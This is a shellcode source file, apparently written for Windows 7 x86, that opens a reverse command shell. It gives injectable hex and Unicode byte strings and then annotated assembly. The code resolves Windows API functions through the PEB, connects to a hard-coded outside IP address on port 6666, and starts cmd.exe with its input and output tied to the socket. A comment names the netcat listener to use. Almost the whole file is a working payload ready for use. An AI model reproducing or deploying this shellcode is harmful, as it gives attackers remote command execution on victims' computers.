/*
Author:Migrane
IF-MODE:N
Language:asm
Func:Back a cmd shell
Data:2019-12-8
*/

/*ascii
"\x33\xC9\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x70\x14\xAD\x96"
"\xAD\x8B\x58\x10\x8B\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x33\xC9"
"\x8B\x72\x20\x03\xF3\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75"
"\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
"\x65\x75\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C"
"\x03\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x66\xB9\x73\x41\x51"
"\x68\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54"
"\x53\xFF\xD2\x83\xC4\x10\x50\x8B\x54\x24\x04\xB9\x66\x6F\x41\x00"
"\x51\x68\x75\x70\x49\x6E\x68\x74\x61\x72\x74\x68\x47\x65\x74\x53"
"\x54\x53\xFF\xD2\x83\xC4\x10\x50\x8B\x54\x24\x08\x33\xC9\x51\x68"
"\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53"
"\xFF\xD2\x83\xC4\x0C\x59\x50\x66\xB9\x33\x32\x51\x68\x77\x73\x32"
"\x5F\x54\xFF\xD0\x83\xC4\x08\x50\x8B\x54\x24\x10\x33\xC9\x66\xB9"
"\x75\x70\x51\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\xFF\x74"
"\x24\x10\xFF\xD2\x83\xC4\x0C\x50\x8B\x54\x24\x14\x8B\x5C\x24\x04"
"\x33\xC9\x66\xB9\x74\x41\x51\x68\x6F\x63\x6B\x65\x68\x57\x53\x41"
"\x53\x54\x53\xFF\xD2\x83\xC4\x0C\x50\x8B\x54\x24\x18\x8B\x5C\x24"
"\x08\x33\xC9\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x53\xFF"
"\xD2\x83\xC4\x08\x50\x8B\x54\x24\x1C\x8B\x5C\x24\x0C\x33\xC9\x66"
"\xB9\x72\x00\x51\x68\x5F\x61\x64\x64\x68\x69\x6E\x65\x74\x54\x53"
"\xFF\xD2\x83\xC4\x0C\x50\x8B\x54\x24\x20\x8B\x5C\x24\x10\x33\xC9"
"\x66\xB9\x73\x00\x51\x68\x68\x74\x6F\x6E\x54\x53\xFF\xD2\x83\xC4"
"\x08\x50\x83\xEC\x20\x8B\x44\x24\x30\x54\x68\x02\x02\x00\x00\xFF"
"\xD0\x8B\x44\x24\x2C\x33\xC9\x51\x51\x51\x66\xB9\x06\x00\x51\x66"
"\xB9\x01\x00\x51\x41\x51\xFF\xD0\x50\x8B\x44\x24\x28\x33\xC9\x66"
"\xB9\x35\x00\x51\x68\x37\x34\x2E\x37\x68\x37\x39\x2E\x31\x68\x31"
"\x32\x30\x2E\x54\xFF\xD0\x83\xC4\x10\x50\x8B\x44\x24\x28\x68\x0A"
"\x1A\x00\x00\xFF\xD0\x8B\x54\x24\x30\x66\x50\x66\xB8\x02\x00\x66"
"\x50\x8B\xDC\x6A\x10\x53\xFF\x74\x24\x10\xFF\xD2\x8B\x74\x24\x08"
"\x56\x56\x56\x33\xF6\x33\xC9\x56\x56\x68\x00\x01\x00\x00\x66\xB9"
"\x0A\x00\x56\xE2\xFD\xB9\x44\x00\x00\x00\x51\x8B\xD4\x8B\x9C\x24"
"\x90\x00\x00\x00\x68\x65\x78\x65\x00\x68\x63\x6D\x64\x2E\x8B\xF4"
"\x52\x52\x33\xC9\x51\x51\x51\x41\x51\x83\xE9\x01\x51\x51\x56\x51"
"\xFF\xD3\x50"
*/


/*Unicode

"\uc933\ua164\u0030\u0000\u408b\u8b0c\u1470\u96ad\u8bad\u1058\u538b\u033c\u8bd3\u7852\ud303\uc933\u728b\u0320\u41f3\u03ad\u81c3\u4738\u7465\u7550\u81f4\u0478\u6f72\u4163\ueb75\u7881\u6408\u7264\u7565\u8be2\u2472\uf303\u8b66\u4e0c\u8b49\u1c72\uf303\u148b\u038e\u33d3\u53c9\u6652\u73b9\u5141\u6f68\u6563\u6873\u6574\u7250\u4368\u6572\u5461\uff53\u83d2\u10c4\u8b50\u2454\ub904\u6f66\u0041\u6851\u7075\u6e49\u7468\u7261\u6874\u6547\u5374\u5354\ud2ff\uc483\u5010\u548b\u0824\uc933\u6851\u7261\u4179\u4c68\u6269\u6872\u6f4c\u6461\u5354\ud2ff\uc483\u590c\u6650\u33b9\u5132\u7768\u3273\u545f\ud0ff\uc483\u5008\u548b\u1024\uc933\ub966\u7075\u6851\u6174\u7472\u5768\u4153\u5453\u74ff\u1024\ud2ff\uc483\u500c\u548b\u1424\u5c8b\u0424\uc933\ub966\u4174\u6851\u636f\u656b\u5768\u4153\u5453\uff53\u83d2\u0cc4\u8b50\u2454\u8b18\u245c\u3308\u68c9\u6365\u0074\u6368\u6e6f\u546e\uff53\u83d2\u08c4\u8b50\u2454\u8b1c\u245c\u330c\u66c9\u72b9\u5100\u5f68\u6461\u6864\u6e69\u7465\u5354\ud2ff\uc483\u500c\u548b\u2024\u5c8b\u1024\uc933\ub966\u0073\u6851\u7468\u6e6f\u5354\ud2ff\uc483\u5008\uec83\u8b20\u2444\u5430\u0268\u0002\uff00\u8bd0\u2444\u332c\u51c9\u5151\ub966\u0006\u6651\u01b9\u5100\u5141\ud0ff\u8b50\u2444\u3328\u66c9\u35b9\u5100\u3768\u2e34\u6837\u3937\u312e\u3168\u3032\u542e\ud0ff\uc483\u5010\u448b\u2824\u0a68\u001a\uff00\u8bd0\u2454\u6630\u6650\u02b8\u6600\u8b50\u6adc\u5310\u74ff\u1024\ud2ff\u748b\u0824\u5656\u3356\u33f6\u56c9\u6856\u0100\u0000\ub966\u000a\ue256\ub9fd\u0044\u0000\u8b51\u8bd4\u249c\u0090\u0000\u6568\u6578\u6800\u6d63\u2e64\uf48b\u5252\uc933\u5151\u4151\u8351\u01e9\u5151\u5156\ud3ff\u0050"
*/


;ASM (reverse a shell)
;Test in WIN7 SP1(x86)
		;get the address of kernel32.dll
		xor ecx,ecx
		mov eax,fs:[0x30];EAX=PEB
		mov eax,[eax+0xc];EAX=PEB->LDR
		mov esi,[eax+0x14];ESI=PEB->Ldr.lnMemOrder
		lodsd	 ;mov eax,[esi];esi+=4;EAX=SecondMod->ntdll
		xchg eax,esi 
		lodsd	;EAX=ThirdMod->kernel
		mov ebx,[eax+0x10] ;EBX=kernel->DllBase

		;Get address of GetProcessAddress
		mov edx,[ebx+0x3c] ;DOS HEADER->PE HEADER offset
		add edx,ebx ;PE HEADER 
		mov edx,[edx+0x78] ;EDX=DATA DIRECTORY
		add edx,ebx ;EDX=DATA DIRECTORY
		
		;compare string 
		xor ecx,ecx
		mov esi,[edx+0x20]
		add esi,ebx

Get_Func:
		inc ecx
		lodsd ;mov eax,esi;esi+=4
		add eax,ebx;
		cmp dword ptr[eax],0x50746547 ;GetP
		jnz Get_Func
		cmp dword ptr[eax+0x4],0x41636f72;proA
		jnz Get_Func
		cmp dword ptr[eax+0x8],0x65726464 ;ddre
		jnz Get_Func
		
		;get address
		mov esi,[edx+0x24] ;AddressOfNameOrdinals
		add esi,ebx
		mov cx,[esi+ecx*2];num
		dec ecx 
		mov esi,[edx+0x1c];AddressOfFunctions
		add esi,ebx
		mov edx,[esi+ecx*4] 
		add edx,ebx ;EDX = GetProcessAddress

;EDX=GetProcAddr
;EBX=kernel32

		;get CreateProcess address
		xor ecx,ecx
		push ebx ;Kernel32
		push edx;GetProcAddr
		mov cx,0x4173;sA
		push ecx ;sA
		push 0x7365636F;oces
		push 0x72506574;tePr
		push 0x61657243;Crea
		push esp ;"CreateProcessA"
		push ebx
		call edx;GetProcAddr("CreateProcessA")

		add esp,0x10 ;clean stack
		push eax ;CreateProcessA
		
		;CreateProcessA <--esp
		;GetProcAddr <-- esp+4
		;Kernel32 <--esp+8

		//mov ebx,[esp+8];Kernel32
		mov edx,[esp+4];GetProAddr

		;get GetStartupInfo address
		mov ecx,0x416F66
		push ecx;foA
		push 0x6E497075;upIn
		push 0x74726174;tart
		push 0x53746547;GetS
		push esp
		push ebx ;Kernel32
		call edx ;GetProAddresss("GetStartupInfoA")


		add esp,0x10;clean stack
		push eax ;GetStartupInfoA
		mov edx,[esp+8];GetProAddr
		;Get LoadLibrary
		xor ecx,ecx
		push ecx ;0
		push 0x41797261 ; aryA
		push 0x7262694c ; Libr
		push 0x64616f4c ; Load 
		push esp;"LoadLibraryA"
		push ebx ;
		call edx ;GerProcAddress("LoadLibraryA")
	

			
		add esp,0xc ;pop "LoadLibraryA"
		pop ecx; ECX=0
		push eax ;EAX=LoadLibraryA
		mov cx,0x3233 ; 32
		push ecx;
		push 0x5F327377 ; ws2_
		push esp        ; "ws2_32"
		call eax        ; LoadLibrary("ws2_32.dll")


		;MessageBoxA address
		add esp,0x8 ;pop "ws2_32.dll"
		push eax
		;ws2_32.dll <--esp
		;LoadLibraryA <--esp+4
		;GetStartupInfoA <--esp+8
		;CreateProcessA <--esp+0c
		;GetProcAddr <-- esp+0x10
		;Kernel32 <--esp+0x14



		mov edx,[esp+0x10] ;GetProcAddress
		xor ecx,ecx
		mov cx,0x7075;up
		push ecx
		push 0x74726174;tart
		push 0x53415357 ;WSAS
		push esp                       ;"WSAStartup"
		push [esp+0x10];ws2_32.dll
		call edx;GetProcAddress("WSAStartup")

		add esp,0xc 
		push eax;WSAStartup

		mov edx,[esp+0x14] ;GetProcAddress
		mov ebx,[esp+4];ws2_32.dll
		xor ecx,ecx
		mov cx,0x4174;
		push ecx ;tA
		push 0x656B636F ;ocke
		push 0x53415357 ;WSAS
		push esp                       ;"WSASocket"
		push ebx;ws2_32.dll
		call edx;GetProcAddress("WSASocket")
		
		add esp,0xc 
		push eax;WSASocket

		mov edx,[esp+0x18] ;GetProcAddress
		mov ebx,[esp+8];ws2_32.dll
		xor ecx,ecx
		push 0x746365 ;ect
		push 0x6E6E6F63 ;conn
		push esp                       ;"connect"
		push ebx;ws2_32.dll
		call edx;GetProcAddress("connect")

		;inet_addr
		add esp,0x8 
		push eax;connect
		mov edx,[esp+0x1c] ;GetProcAddress
		mov ebx,[esp+0xc];ws2_32.dll
		xor ecx,ecx
		mov cx,0x72;
		push ecx;r
		push 0x6464615F;_add
		push 0x74656E69;inet
		push esp                       ;"inet_addr"
		push ebx;ws2_32.dll
		call edx;GetProcAddress("inet_addr")
		
		;htons
		add esp,0xc
		push eax;
		mov edx,[esp+0x20] ;GetProcAddress
		mov ebx,[esp+0x10];ws2_32.dll
		xor ecx,ecx
		mov cx,0x73
		push ecx;s
		push 0x6E6F7468;hton
		push esp                       ;"htons"
		push ebx;ws2_32.dll
		call edx;GetProcAddress("htons")

		add esp,0x8
		push eax

		;htons <--esp
		;inet_addr <--esp+4
		;connect <--esp+8
		;WSASocket <--esp+0xc
		;WSAStartup <--esp+0x10
		;ws2_32.dll <--esp+0x14
		;LoadLibraryA <--esp+0x18
		;GetStartupInfoA <--esp+1c
		;CreateProcessA <--esp+0x20
		;GetProcAddr <-- esp+0x24
		;Kernel32 <--esp+0x28

		/*Socket部分*/

		
		//WSTartup(0x202,&WSADATA,)
		sub esp,0x20
		mov eax,[esp+0x30]
		push esp;lpWSADATA
		push 0x202;wVersionRequested
		call eax //if eax->0 sucess.else fail

		
		//WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0)
		mov eax,[esp+0x2c];WSASocket
		xor ecx,ecx
		push ecx
		push ecx
		push ecx
		mov cx,0x6
		push ecx
		mov cx,0x1
		push ecx
		inc ecx
		push ecx
		call eax

		push eax; //push socket


		//inet_addr(120.79.174.75)
		mov eax,[esp+0x28] ;inet_addr
		xor ecx,ecx
		mov cx,0x35
		push ecx;5
		push 0x372E3437;74.7
		push 0x312E3937;79.1
		push 0x2E303231;120.
		push esp;
		call eax;
		
		add esp,0x10
		push eax;push Remote_addr -->sa_data+2

		//htons(6666)
		mov eax,[esp+0x28] ;htons
		push 0x1A0A ;6666
		call eax

		mov edx,[esp+0x30];connect
		//Store sock_addr
		push ax;push Remote_ports -->sa_data
		mov ax,0x2
		push ax;push AF_INET -->sa_family

		mov ebx,esp; store sock_addr
		
		//Connect(socket,&sock_addr,sizeof(sock_addr));
		/*
		00000000 sockaddr        struc ; (sizeof=0x10, align=0x2, copyof_12)
		00000000                                         ; XREF: _wmain_0/r
		00000000 sa_family --> AF_INET(2)               ; XREF: _wmain_0+80/w
		00000002 sa_data  -->  htons(REMOTE_PROT)        ; XREF: _wmain_0+75/w
		00000004 sa_data+2 --> inet_addr(REMOTE_ADDR)     ; _wmain_0+9B/w
		00000010 sockaddr        ends
		*/

		push 0x10 ; sizeof(sock_addr)
		push ebx ;scok_addr
		push [esp+0x10];socket

		call edx ;connect  ;	server#nc -l 6666 (close fire wall)
		
		
		/*创建cmd.exe子进程*/

		/*
		00000000 _STARTUPINFOW   struc ; (sizeof=0x44, align=0x4, copyof_14)
		00000000                                         ; XREF: _wmain_0/r
		00000000 cb              ->size 44               ; XREF: _wmain_0+134/w
		00000004 lpReserved      dd ?                    ; offset
		00000008 lpDesktop       dd ?                    ; offset
		0000000C lpTitle         dd ?                    ; offset
		00000010 dwX             dd ?
		00000014 dwY             dd ?
		00000018 dwXSize         dd ?
		0000001C dwYSize         dd ?
		00000020 dwXCountChars   dd ?
		00000024 dwYCountChars   dd ?
		00000028 dwFillAttribute dd ?
		0000002C dwFlags         <--0x100
		00000030 wShowWindow     dw
		00000032 cbReserved2     dw ?
		00000034 lpReserved2     dd ?                    ; offset
		00000038 hStdInput       ->socket                ; XREF: _wmain_0+159/w ; offset
		0000003C hStdOutput      ->socket                 ; XREF: _wmain_0+14D/w
		00000040 hStdError       ->socket                 ; XREF: _wmain_0+141/w
		00000040                                         ; _wmain_0+147/r ; offset
		00000044 _STARTUPINFOW   ends
		00000044
*/
		//init _STARTUPINFO
		
		mov esi,[esp+0x8]
		push esi; push hStdError
		push esi; push hStdOutput
		push esi; push StdInput
		xor esi,esi
		xor ecx,ecx
		push esi;
		push esi;
		push 0x100; dwFlags
		mov cx,0xa

PUSH_NULL:	
		push esi
		loop PUSH_NULL

		mov ecx,0x44 ;cb
		push ecx
		mov edx,esp ;_STARTUPINFO

		mov ebx,[esp+0x90];CreateProcess

		push 0x657865;exe
		push 0x2E646D63;cmd.
		mov esi,esp ;"cmd.exe"
		//CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)

		push edx;&pi
		push edx ;&si
		xor ecx,ecx
		push ecx;NULL
		push ecx;NULL
		push ecx;NULL
		inc ecx
		push ecx;TRUE
		sub ecx,0x1
		push ecx;NULL
		push ecx;NULL
		push esi;cmdline
		push ecx;NULL
		call ebx;CreateProcess

		push eax
		
		nop
		nop
		nop



